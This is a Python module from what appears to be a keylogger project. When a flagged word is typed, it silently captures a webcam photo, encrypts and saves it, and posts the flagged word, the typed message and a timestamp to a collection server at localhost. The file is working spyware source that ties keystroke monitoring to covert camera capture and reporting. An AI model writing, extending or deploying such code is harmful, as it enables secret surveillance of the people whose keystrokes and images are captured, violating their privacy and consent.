import cv2
import os
import requests
from datetime import datetime
from encryption import encrypt_image

# Define the images folder path
IMAGES_FOLDER = os.path.join("keylogger","images")

# Create the images folder if it doesn't exist
if not os.path.exists(IMAGES_FOLDER):
    os.makedirs(IMAGES_FOLDER)
    print(f"Created images folder at: {os.path.abspath(IMAGES_FOLDER)}")

def capture_and_send_image(flagged_word, flagged_message):
    # Capture image from webcam
    cap = cv2.VideoCapture(0)  # 0 is the default camera (selfie camera)
    if not cap.isOpened():
        print("Error: Could not access the webcam.")
        return

    print("Webcam accessed successfully.")

    ret, frame = cap.read()
    if ret:
        print("Frame captured successfully.")
        # Resize the image to a specific width and height
        width, height = 400, 200  # Set your desired width and height
        frame = cv2.resize(frame, (width, height))

        # Save the image with a timestamped filename
        timestamp_filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # For filenames
        image_path = os.path.join(IMAGES_FOLDER, f"{timestamp_filename}.jpg")
        cv2.imwrite(image_path, frame)
        print(f"Image captured and saved to {image_path}")

        # Encrypt the image immediately after saving
        encrypted_path = encrypt_image(image_path)
        print(f"Image encrypted and saved to {encrypted_path}")

        # Replace `-` with `:` in the timestamp for display purposes
        timestamp_display = timestamp_filename.replace("-", ":")

        # Send the metadata to the server (image itself is already saved encrypted)
        try:
            data = {
                "filename": os.path.basename(encrypted_path),
                "flagged_word": flagged_word,
                "flagged_message": flagged_message,
                "timestamp": timestamp_display
            }
            response = requests.post("http://localhost:5000/upload_flagged_image", data=data)
            if response.status_code == 200:
                print("Image metadata successfully sent to the server.")
            else:
                print(f"Failed to send metadata to the server. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending metadata to the server: {e}")
    else:
        print("Error: Could not capture image from the webcam.")

    cap.release()